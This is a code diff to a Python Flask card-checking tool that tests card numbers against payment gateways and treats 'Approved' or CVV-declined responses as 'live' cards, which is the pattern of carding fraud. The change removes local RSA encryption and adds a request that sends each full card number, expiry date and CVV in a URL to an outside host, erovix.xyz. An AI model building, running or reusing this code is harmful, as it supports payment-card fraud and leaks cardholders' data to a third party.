@@ -10,8 +10,6 @@ from time import sleep
 from typing import Dict, Optional
 from faker import Faker
 from urllib.parse import urljoin
-from Crypto.Cipher import PKCS1_v1_5
-from Crypto.PublicKey import RSA
 
 app = Flask(__name__)
 
@@ -219,20 +217,21 @@ class GatewaysDeveloper:
         
         return None
 
-    def _Encrypt(self, _Card="", _Mm="", _Yy="", _Cvv="", _FieldKey=""):
-        if len(_Yy) == 2:
-            _Yy = f"20{_Yy}"
-        if len(_Mm) == 1:
-            _Mm = f"0{_Mm}"
-        
-        Prefix = ".".join(str(random.randint(0, 255)) for _ in range(4))
-        Payload = f"#{Prefix}#{_Card}#{_Cvv}#{_Mm}#{_Yy}"
-        Encoded = b64encode(Payload.encode())
-        FieldKey = _FieldKey.strip()
-        if "BEGIN PUBLIC KEY" not in FieldKey:
-            FieldKey = f"-----BEGIN PUBLIC KEY-----\n{FieldKey}\n-----END PUBLIC KEY-----"
-        Cipher = PKCS1_v1_5.new(RSA.import_key(FieldKey))
-        return b64encode(Cipher.encrypt(Encoded)).decode()
+    def _Encrypt(self, _Card="", _Mm="", _Yy="", _Cvv=""):
+        try:
+            if len(_Yy) == 2:
+                _Yy = f"20{_Yy}"
+            if len(_Mm) == 1:
+                _Mm = f"0{_Mm}"
+            
+            cc_string = f"{_Card}|{_Mm}|{_Yy}|{_Cvv}"
+            response = requests.get(f"https://erovix.xyz/Eway/enc.php?cc={cc_string}")
+            if response.status_code == 200:
+                data = response.json()
+                return data.get('encrypted', '')
+        except:
+            pass
+        return ""
 
     def _VerifyStatusResponse(self, message):
         _live = ["Transaction declined.2010 - Card Issuer Declined CVV", "Approved"]
@@ -630,7 +629,7 @@ class GatewaysDeveloper:
                 continue
 
             try:
-                EncryptCard = self._Encrypt(_Card=_card, _Mm=_mm, _Yy=_yy, _Cvv=_cvv, _FieldKey=ZuoraFieldKey)
+                EncryptCard = self._Encrypt(_Card=_card, _Mm=_mm, _Yy=_yy, _Cvv=_cvv)
                 if not EncryptCard:
                     print("✗ Failed to encrypt card")
                     continue
